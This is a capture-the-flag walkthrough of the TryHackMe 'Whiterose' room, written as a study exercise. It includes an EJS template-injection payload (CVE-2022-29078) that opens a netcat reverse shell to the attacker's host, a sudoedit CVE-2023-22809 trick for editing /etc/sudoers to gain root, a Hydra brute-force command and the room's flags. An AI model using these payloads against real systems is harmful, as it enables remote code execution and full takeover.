- - - 
created : 20-07-2025 

Tags : #easy #detailed 
- - - 
# Objective

## Welcome to Whiterose

This challenge is based on the Mr. Robot episode "409 Conflict". Contains spoilers!

Go ahead and start the machine, it may take a few minutes to fully start up.

And oh! I almost forgot! - You will need these: `Olivia Cortez:olivi8`             10.10.72.252

**_Can you take down the Deus group?_**
# Recon

## Rustscan/Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/Whiterose]
└─$ rustscan -a 10.10.72.252 -- -A  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.72.252:22
Open 10.10.72.252:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).

```

# Enumeration

## HTTP (80)

We know there's a [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) so we add `cyprusbank.thm` to /etc/hosts and let's jump in :

![Pasted image 20250720104222.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720104222.png)

Nothing interesting in the code .

#### Gobuster

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to find other hidden directories :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/Whiterose]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://cyprusbank.thm/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cyprusbank.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 252]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================

```

Nothing more, so we try for vhosts .

#### FFuf

We use [FFuf](../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to find hidden Vhosts [Fuzzing](../../3%20-%20Tags/Hacking%20Concepts/Fuzzing.md) the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md):

```
┌──(mdn0x㉿mdn0xonKali)-[~/Scrivania]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.cyprusbank.thm' -u http://cyprusbank.thm -fs 57 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 57
________________________________________________

ADMIN                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 55ms]
Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 56ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 52ms]
```

## SSH (22)

Remember we have some credentials, let's try to use it on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) port 22, maybe reused, we can't access .

### Hydra

I tried to find a password on ssh for user `olivia` and with [Hydra](../../3%20-%20Tags/Hacking%20Tools/Hydra.md) to get access to the system but hadn't success (too many errors) :

```
──(mdn0x㉿mdn0xonKali)-[~/THM/Whiterose]
└─$ hydra -l olivia -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt  10.10.72.252 ssh -vvv 
```

### First Access

We have something /admin.cyprusbank.thm, let's add it to our /etc/hosts file to the [IP address](../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) of the machine and visit the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) :

![Pasted image 20250720111727.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720111727.png)

So let's try the credentials :

![Pasted image 20250720111843.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720111843.png)

Boom, so Olivia seems admin of the Bank [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) but can't read the phone numbers, we need Tyrell Wellick's phone number so we need to start escalation .

### Information Gathering

We start gathering info by finding some [IDOR](../../3%20-%20Tags/Hacking%20Concepts/IDOR.md) vulnerability on the messages page :

![Pasted image 20250720112822.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720112822.png)

If we go to c=0 or c=8 we have something :

![Pasted image 20250720112954.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720112954.png)

Let's try to enter with these creds :

![Pasted image 20250720113101.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720113101.png)

Now we can read Tyrell phone : `842-029-5701`

We also unlock the new `settings` panel, which will likely be our path for exploitation.

# Exploitation

We can try to use the /settings paneland exploring this functionality further, it looks like we can change the password of a user. More importantly, we have to pay attention with how our input is displayed on the page :

![Pasted image 20250720114027.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720114027.png)

The text is _reflected back_ on the web page. This immediately makes me think of two common vulnerabilities, that being [Cross-site Scripting (XSS)](../../3%20-%20Tags/Hacking%20Concepts/Cross-site%20Scripting%20(XSS).md)or [Server Side Template Injection (SSTI)](../../3%20-%20Tags/Hacking%20Concepts/Server%20Side%20Template%20Injection%20(SSTI).md). 

## Burp Suite

To further explore these potentials, let’s hop into [BurpSuite](../../3%20-%20Tags/Hacking%20Tools/BurpSuite.md) and intercept a request and play around with the parameters.

Trying to make the server throw an error is the best way to discover vulnerabilities and the path forward. To do this, a good first thing to try is simply taking away a parameter! I took away the password parameter and received this error :

<img alt="" class="bh ll np c" width="633" height="732" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:633/1*C4bRuqOkNp6p3q4z05v2Vg.png">

This may not look like a lot at first, but this error leaks the Javascript template used! **Embedded JavaScript (EJS)**, is a simple and powerful templating engine used with Node.js applications. This confirms our suspicion regarding a SSTI injection!

As I mentioned before, there are only a limited number of options allowed to be passed along with data. However, this is where the `CVE-2022-29078` vulnerability comes into play. By using the `settings['view options']` parameter, we are able to pass any option without limitation.

And there are certain options, like `outputFunctionName`, that are used by **EJS** without any filtration to build the template body, allowing us to inject code it.

[Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) Article - [CVE-2022-29078](../../3%20-%20Tags/CVEs/CVE-2022-29078.md)

https://eslam.io/posts/ejs-server-side-template-injection-rce/?source=post_page-----156eff2b6dee---------------------------------------

**PoC**

![Pasted image 20250720114815.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720114815.png)

Now, we can use it to obtain a [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md), first by using our web server to serve a [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md), we create teh [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) :

```bash
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.8.162.183 1337 -e /bin/sh');s
```

Set up the listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and execute it by pasting it in the password field after the password :

![Pasted image 20250720140643.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720140643.png)

Now we check [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```
whoami
web
cat user.txt
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```
## Shell Stabilization

We can do now [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) :

```
export TERM=xterm    
python3 -c 'import pty;pty.spawn("/bin/bash")'  
web@cyprusbank:~$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                        
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Whiterose]
└─$ stty raw -echo;fg 
[1]  + continued  nc -lvnp 1337
                               reset
web@cyprusbank:~$ 

```

Now we have a more stabile shell .

# Privilege Escalation

[CVE-2023-22809](../../3%20-%20Tags/CVEs/CVE-2023-22809.md)

We start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) checking for `sudo -l` :

```
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

So now we check the version for `sudoedit` :

```
web@cyprusbank:/$ sudoedit --version
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```

And check for vulnerabilities.

Looking for vulnerabilities in the `sudoedit` version `1.9.12p1`, we find the `CVE-2023-22809` vulnerability. You can find detailed information about it in [this security advisory from Synacktiv](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf).

Essentially, `sudoedit` allows users to choose their editor using environment variables such as `SUDO_EDITOR`, `VISUAL`, or `EDITOR`. Since the values of these variables can be not only the editor itself but also the arguments to pass to the chosen editor, `sudo` uses `--` while parsing them to separate the editor and its arguments from the files to open for editing.

This means that by using the `--` argument in the editor environment variables, we can force it to open files other than those allowed in the `sudoedit` command we can run. Consequently, since we can execute `sudoedit` as `root` with `sudo`, we can edit any file we want as `root`.

To use this vulnerability for privilege escalation, there are many files we could write to. In this case, we can simply choose to write to the `/etc/sudoers` file to grant ourselves full `sudo` privileges.

We can exploit the vulnerability as follows:

```
web@cyprusbank:~/app$ export EDITOR="nano -- /etc/sudoers" 
web@cyprusbank:~/app$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

As we can see, we were able to open the `/etc/sudoers` file with `nano`.

Now, by making the addition of `web ALL=(ALL) NOPASSWD: ALL` to the file, we can grant our current user full `sudo` privileges :

![Pasted image 20250720142333.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720142333.png)

After saving the file and closing both files, we can see the changes made to our `sudo` privileges :

```
web@cyprusbank:~/app$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
    (ALL) NOPASSWD: ALL
```

Finally, by simply running `sudo su -`, we can get a shell as the `root` user and read the root flag at `/root/root.txt` :

```
web@cyprusbank:~/app$ sudo su -
root@cyprusbank:~# ls
clean.sh  root.txt
root@cyprusbank:~# cat root.txt
THM{4nd_uR_p4ck4g3s}
```

Pwned !! 